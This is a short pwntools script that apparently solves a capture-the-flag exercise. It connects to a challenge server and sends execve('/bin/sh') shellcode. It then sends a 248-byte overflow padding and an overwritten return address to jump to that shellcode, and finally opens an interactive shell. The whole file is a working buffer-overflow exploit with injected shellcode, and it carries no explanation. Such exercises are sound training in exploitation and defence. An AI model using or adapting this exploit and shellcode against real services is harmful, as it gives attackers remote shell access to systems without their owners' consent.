#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10126)

addr = 0x601080
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r.recvuntil(':')
r.sendline(shellcode)
r.recvuntil(':')
r.send('a' * 248 + p64(addr))
r.interactive()
